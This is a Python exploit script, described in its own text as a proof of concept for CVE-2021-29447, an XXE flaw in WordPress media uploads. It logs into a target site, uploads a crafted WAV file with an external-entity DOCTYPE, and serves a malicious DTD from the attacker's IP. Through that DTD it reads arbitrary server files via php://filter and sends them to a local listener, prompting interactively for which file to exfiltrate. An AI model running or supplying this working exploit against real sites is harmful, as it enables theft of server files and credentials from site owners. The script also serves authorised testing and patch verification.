import argparse,requests, os, re, http.server, socketserver, urllib.parse, threading, base64, time, sys

PORT = 45454
DESCRIPTION = f"This is a tool for demostrating a Proof of Concept for the CVE-2021-29447 affecting WordPress versions 5.7, 5.6.2, 5.6.1, 5.6, 5.0.11\n Requires available port on {PORT}"
PAYLOAD_NAME = "payload.wav"
SERVER_STATUS = True
EXFILTRATED_FILE = bytes()
DTD_NAME = "xxe.dtd"
NONCE = str()
SESSION = requests.Session()

def config_parser():
    parser = argparse.ArgumentParser(description=DESCRIPTION)
    parser.add_argument("--url",metavar="URL", help="Target host's URL", required=True)
    parser.add_argument("--server-ip", metavar="SERVER IP", help="Your IP. Used to host a server to receive the files.", required=True)
    parser.add_argument("-u",metavar="Username", help="User's Username", required=True)
    parser.add_argument("-p",metavar="Password", help="User's Password", required=True)
    return parser

def parse_args():
    parser = config_parser()
    args = parser.parse_args()
    return args.url, args.u, args.p, args.server_ip

def connectivity_test(url: str):
    try:
        response = SESSION.get(f"{url}/wp-login.php", verify=False)
        if response.status_code == 200:
            return True
    except:
        print("[*] ERROR: An error occured whilst connecting to {url}/wp-login.php\n[*] Ensure the URL is correct and host is live.\n[*] Exiting...")
        return False

def wordpress_authenticate(url: str, username: str, password: str):
    try:
        print(f"[*] Attempting to authenticate to {url}/wp-login.php with {username}:{password}")
        data = {"log": username, 
                "pwd": password,
                "wp-submit" : "Log In",
                "redirect_to": f"{url}/wp-admin/",
                "testcookie":"1"}
        response = SESSION.post(f'{url}/wp-login.php', data=data, verify=False)

        if response.status_code == 200 and "login_error" not in response.text: 
            print("[*] Authenticated successfully.")
            return True
        else:
            print(f"[*] Unable to authenticate with {username}:{password}\n[*] Exiting...")
            return False

    except:
        print(f"[*] ERROR: An error occured whilst connecting to {url}/wp-login.php\n[*] Ensure the URL is correct and host is live.\n[*] Exiting...")    
        return False

def get_nonce(url: str):
    global NONCE
    try:
        print("[*] Retrieving upload nonce.")
        response = SESSION.get(f"{url}/wp-admin/upload.php", verify=False)
        NONCE = re.search('"multipart_params":{"action":"upload-attachment","_wpnonce":"[0-9a-z]+"', response.text).group(0).split(":")[3].strip("\"")
        print(f"[*] Nonce retrieved successfully: {NONCE}")
        return True
    
    except:
        print(f"[*] ERROR: Unable to retrieve nonce from {url}/wp-admin/upload.php\nExiting...")
        return False
    

def generate_wav_payload(ip: str):
    try:
        with open(PAYLOAD_NAME, "wb") as payload:
            xml = b'<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM "http://' + bytes(ip, encoding="utf-8") + b':' + bytes(str(PORT), encoding="utf-8") + b'/xxe.dtd">%remote;%init;%exfiltrate;]>'
            payload.write(b"RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00"+xml+b"\x00")
            print("[*] Generated a WAV payload with XXE.")
            return True
    except:
        print("ERROR: An unexpected error has occured when generating a temporary payload. Check permissions.\n[*] Exiting...")
        return False

def remove_payload_file(file: str):
    try: 
        os.remove(file)
    except:
        pass

def upload_wav(url: str):
    time.sleep(1.5)
    try:
        file = {'async-upload': (PAYLOAD_NAME, open(PAYLOAD_NAME, 'rb'))}
        data = {'name': PAYLOAD_NAME,
            'action': 'upload-attachement',
            '_wpnonce': NONCE,
            }
        print("[*] Uploading the WAV payload.")
        response = SESSION.post(f'{url}/wp-admin/async-upload.php', data=data, files=file)

        if response.status_code == 200:
            print("[*] WAV payload uploaded successfully.")
            return True
        else:
            print("[*] ERROR: An error occured while uploading the WAV payload.\nExiting...")
            return False
    except:
        print("[*] ERROR: An unexpected error occured with the connection.\nExiting...")
        return False

def parse_bytes_DTD():
    DTD_bytes = bytes()
    with open(DTD_NAME, "br") as dtd:
        for line in dtd:
            DTD_bytes += line
    return DTD_bytes

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        global EXFILTRATED_FILE 
        data = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get('data', None)

        if data is None:
            EXFILTRATED_FILE = bytes()
            self.send_response(200)
            self.send_header('Content-type', 'application/xml')
            self.end_headers()
            self.wfile.write(parse_bytes_DTD())
        else:
            data = data[0]
            if data[len(data)-2:len(data)] != '==':
                data += '=='
            EXFILTRATED_FILE = base64.b64decode(data)
        

def start_http_server(ip: str):
    global SERVER_STATUS
    try:
        with socketserver.TCPServer((ip, PORT), RequestHandler) as server:
            print(f"[*] Server listening on {ip}:{PORT}")
            SERVER_STATUS = True
            server.serve_forever()

    except:
        print(f"[*] ERROR: Unable to start HTTP server on {ip}:{PORT}\n[*] Ensure that port {PORT} is available.\nExiting...")
        SERVER_STATUS = False
        sys.exit()

def generate_dtd(file: str, ip: str):
    remove_payload_file(DTD_NAME)
    time.sleep(1.5)
    try:
        with open(DTD_NAME, "wb") as dtd_file:
            dtd_file.write(b'<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=' + 
            bytes(file,encoding="utf-8") + b'">\n<!ENTITY % init "<!ENTITY &#x25; exfiltrate SYSTEM \'http://' + 
            bytes(ip, encoding="utf-8") + b":" + bytes(str(PORT), encoding="utf-8") + b'/?data=%file;\'>" >')
            time.sleep(1.5)
            print("[*] Created DTD file.")
            return True

    except:
        print("ERROR: An unexpected error has occured when creating DTD. Check permissions.\n[*] Exiting...")
        return False

def bytes_decode(bytes: bytes):
    decoded = str()
    for byte in bytes:
        try:
            decoded += chr(byte)
        except:
            break
    return decoded

if __name__ == "__main__":
    try:
        url, username, password, ip = parse_args()
        server = threading.Thread(target=start_http_server, args=[ip])
        server.daemon = True
    
        if connectivity_test(url) and \
            wordpress_authenticate(url, username, password) and \
                generate_wav_payload(ip) and get_nonce(url):
                    server.start()
                    time.sleep(1.5)
                    while SERVER_STATUS:
                        file = input("\nFile to Exfiltrate: ")
                        if generate_dtd(file, ip) and upload_wav(url):
                            time.sleep(1.5)
                            if len(EXFILTRATED_FILE) > 0:
                                print(f"\n[*] File extracted successfully:\n\n{bytes_decode(EXFILTRATED_FILE)}")
                            else:
                                print("\n[*] File not found or lack file permissions.")
    except KeyboardInterrupt:
        print("\n[*] Deleting DTD and WAV payload from your directory before exiting.")
        remove_payload_file(DTD_NAME)
        time.sleep(1)
        remove_payload_file(PAYLOAD_NAME)
        time.sleep(1)
        print("[*] Exiting...")
        sys.exit()


